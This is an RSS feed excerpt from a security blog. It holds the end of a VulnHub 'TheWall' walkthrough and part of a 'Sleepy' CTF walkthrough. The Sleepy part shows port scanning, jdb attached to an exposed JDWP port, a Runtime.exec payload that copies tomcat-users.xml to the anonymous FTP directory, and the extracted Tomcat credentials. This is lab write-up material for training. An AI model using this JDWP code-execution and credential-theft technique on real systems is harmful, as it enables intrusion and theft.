&lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1004&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DavidGilmour&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 67&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
1005&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;welcometothemachine&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su -
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
root
&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;operator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 31&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/thewall/thewall-root-flag.png&quot; alt=&quot;VulnHub TheWall Root Flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>/dev/random: Sleepy Walkthrough CTF</title>
          <link>https://highon.coffee/blog/sleepy-ctf-walkthrough/</link>
          <pubDate>Thu, 26 Nov 2015 21:12:52 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/sleepy-ctf-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&amp;lt;/i&amp;gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#description&quot; id=&quot;markdown-toc-description&quot;&gt;Description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#jserv-enumeration&quot; id=&quot;markdown-toc-jserv-enumeration&quot;&gt;JServ Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#jdwp-enumeration&quot; id=&quot;markdown-toc-jdwp-enumeration&quot;&gt;JDWP Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#apache-tomcat-jserv-proxy-setup&quot; id=&quot;markdown-toc-apache-tomcat-jserv-proxy-setup&quot;&gt;Apache Tomcat JServ Proxy setup&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#apache-tomcat-proxy-setup-script&quot; id=&quot;markdown-toc-apache-tomcat-proxy-setup-script&quot;&gt;Apache Tomcat Proxy Setup Script&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#remote-exploitation&quot; id=&quot;markdown-toc-remote-exploitation&quot;&gt;Remote Exploitation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#meterpreter-shell&quot; id=&quot;markdown-toc-meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#binary-interrogation&quot; id=&quot;markdown-toc-binary-interrogation&quot;&gt;Binary Interrogation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bash-function-manipulation&quot; id=&quot;markdown-toc-bash-function-manipulation&quot;&gt;Bash Function Manipulation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Sleepy&lt;/strong&gt; is part of the /dev/random: series created by Sagi-, it’s a little more difficult than &lt;a href=&quot;/blog/pipe-ctf-walkthrough/&quot;&gt;Pipe&lt;/a&gt; depending on your skill set.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; &lt;a href=&quot;https://twitter.com/s4gi_&quot;&gt;@s4gi_ &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/devrandom-sleepy,123/&quot;&gt;/dev/random: Sleepy&lt;/a&gt; via &lt;a href=&quot;https://twitter.com/VulnHub&quot;&gt;@VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;_________.__                              
/   _____/|  |   ____   ____ ______ ___.__.
&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;____  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|  | _/ __ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/ __ &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;____ &amp;lt;   |  |
/        &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |_&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; ___/&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; ___/|  |_&amp;gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;___  |
/_______  /|____/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   __// ____| ·VM·
      &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;           &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;|__|   &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;##Enumeration&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.146

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
8009/tcp open  ajp13   syn-ack Apache Jserv &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Protocol v1.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
9001/tcp open  jdwp    syn-ack Java Debug Wire Protocol &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Reference Implementation&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; version 1.6 1.7.0_71
MAC Address: 00:0C:29:8C:41:F7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Uptime guess: 49.709 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Wed Oct  7 20:28:44 2015&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;###Service Enumeration&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 21&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;FTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;vsftpd 2.0.8 or later&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 8009&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;ajp13&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache Jserv (Protocol v1.3)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 9001&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;jdwp&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Java Debug Wire Protocol version 1.6 1.7.0_71&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;###FTP Enumeration&lt;/p&gt;

&lt;p&gt;As nmap  indicated, FTP had anonymous access enabled. Interrogation of the service revealed &lt;code&gt;/pub/sleepy.png &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sleepy/sleepy.png&quot; alt=&quot;base64 image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;jserv-enumeration&quot;&gt;JServ Enumeration&lt;/h3&gt;

&lt;p&gt;JServ protocol is exposed with no web server proxy, JServ acts as a proxy and requires a web server to proxy it’s requests.&lt;/p&gt;

&lt;h3 id=&quot;jdwp-enumeration&quot;&gt;JDWP Enumeration&lt;/h3&gt;

&lt;p&gt;Unauthenticated JDWP is exposed:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root]# jdb &lt;span class=&quot;nt&quot;&gt;-attach&lt;/span&gt; 192.168.30.146:9001&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Research indicated it was possible to interrupt threads, with the command: &lt;code&gt;interupt&lt;/code&gt; allowing for arbitrary code execution.&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;JDWP Commands&lt;/h5&gt;
  &lt;p&gt;Type &lt;code&gt;help&lt;/code&gt; for a list of &lt;b&gt;JDWP&lt;/b&gt; commands.&lt;/p&gt;
&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root]# jdb &lt;span class=&quot;nt&quot;&gt;-attach&lt;/span&gt; 192.168.30.146:9001                                                                                                                                                 
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; threads
Group system:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;java.lang.ref.Reference&lt;span class=&quot;nv&quot;&gt;$ReferenceHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;0x19d Reference Handler cond. waiting
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;java.lang.ref.Finalizer&lt;span class=&quot;nv&quot;&gt;$FinalizerThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;0x19e  Finalizer         cond. waiting
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;java.lang.Thread&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;0x19f                         Signal Dispatcher running
Group main:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;java.lang.Thread&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;0x1a1                         main              sleeping
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; interrupt 0x1a1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
Exception occurred: java.lang.InterruptedException &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uncaught&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;thread=main&quot;&lt;/span&gt;, java.lang.Thread.sleep&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;bci&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;

main[1] print new java.lang.String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new java.io.BufferedReader&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new java.io.InputStreamReader&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new java.lang.Runtime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.getInputStream&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt;.readLine&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
java.lang.NullPointerException
	at com.sun.tools.example.debug.expr.LValue.argumentsMatch&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LValue.java:268&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.LValue.resolveOverload&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LValue.java:399&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.LValue.makeNewObject&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LValue.java:820&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.AllocationExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:1119&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.PrimaryPrefix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:961&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.PrimaryExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:909&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.PostfixExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:834&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpressionNotPlusMinus&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:757&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:687&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.MultiplicativeExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:611&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.AdditiveExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:580&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.ShiftExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:542&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.RelationalExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:504&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.InstanceOfExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:485&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.EqualityExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:455&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.AndExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:433&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.ExclusiveOrExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:412&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.InclusiveOrExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:391&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalAndExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:370&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalOrExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:349&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.ConditionalExpression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:321&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.Expression&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:256&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.expr.ExpressionParser.evaluate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ExpressionParser.java:81&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.tty.Commands.evaluate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Commands.java:114&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.tty.Commands.doPrint&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Commands.java:1654&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.tty.Commands&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;.action&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Commands.java:1680&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	at com.sun.tools.example.debug.tty.Commands&lt;span class=&quot;nv&quot;&gt;$AsyncExecution$1&lt;/span&gt;.run&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Commands.java:66&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 new java.lang.String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new java.io.BufferedReader&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new java.io.InputStreamReader&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new java.lang.Runtime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.getInputStream&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt;.readLine&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; null
main[1] &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The Java code above copied the &lt;code&gt;/etc/tomcat/tomcat-users.xml&lt;/code&gt; file to &lt;code&gt;/var/ftp/pub&lt;/code&gt;. The default location for pub ftp on CentOS.&lt;/p&gt;

&lt;p&gt;tomcat-users.xml was download to the attacking machine and the following credentials were extracted:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;sl33py&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;Gu3SSmYStR0NgPa$sw0rD!&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;Full tomcat-users.xml file for completeness:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version='1.0' encoding='utf-8'?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &quot;License&quot;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tomcat-users&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
  NOTE:  By default, no user is included in the &quot;manager-gui&quot; role required
  to operate the &quot;/manager/html&quot; web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.
--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
  NOTE:  The sample user and role entries below are wrapped in a comment
  and thus are ignored when reading this file. Do not forget to remove
  &amp;lt;!.. ..&amp;gt; that surrounds them.
--&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tomcat&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;role1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status&quot;/&amp;gt; --&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;user&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;both&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tomcat&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;roles=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tomcat,role1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;user&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;role1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tomcat&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;roles=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;role1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rolename=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin-gui&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
